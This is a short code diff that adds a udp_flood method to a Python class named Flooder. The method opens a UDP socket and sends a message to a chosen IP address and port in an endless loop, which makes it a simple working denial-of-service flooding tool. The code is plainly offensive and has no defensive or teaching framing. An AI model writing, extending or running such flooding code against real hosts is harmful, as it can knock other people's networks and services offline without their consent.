@@ -23,3 +23,15 @@ class Flooder:
             if i >= 10:
                 i = 0
                 self.logger.debug("10 pakets sent!")
+
+    def udp_flood(self, ip, port, message):
+        self.logger.info("Building udp socket...")
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            self.logger.info("Done!")
+        except Exception as e:
+            self.logger.error(e)
+            return
+        self.logger.info("Starting flood now...")
+        while True:
+            s.sendto(bytes(message, "ascii"), (ip, port))
